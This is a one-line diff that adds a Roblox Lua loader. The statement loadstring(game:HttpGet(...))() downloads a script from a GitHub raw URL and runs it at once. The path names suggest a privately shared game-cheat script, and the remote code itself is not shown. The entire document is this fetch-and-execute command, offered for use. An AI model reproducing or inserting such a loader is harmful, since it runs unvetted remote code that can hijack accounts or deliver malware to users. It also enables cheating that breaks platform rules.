@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadLyno/BasicallyItSMeButMyNameWasCrashedSoINamedToEZ/main/SoBasicallyEasy.ggis-%3E/TrashForever/FvckEasyGames/EzLynoToday/SoBasicallyIfYouLeakWillGotBan/OfCourseDon'tAskMeMakeScripts/ahhhAlsoDon'tShare/OrBan.lua"))()
